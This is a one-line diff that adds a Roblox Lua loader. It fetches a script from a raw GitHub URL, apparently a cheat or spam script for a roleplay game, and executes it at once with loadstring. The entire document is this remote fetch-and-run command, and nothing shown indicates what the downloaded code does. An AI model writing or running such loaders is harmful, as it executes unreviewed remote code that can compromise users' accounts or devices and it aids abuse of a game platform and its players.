@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/lifetogether-rp-families-spam5-pqg001aao5wnlb.lua"))()
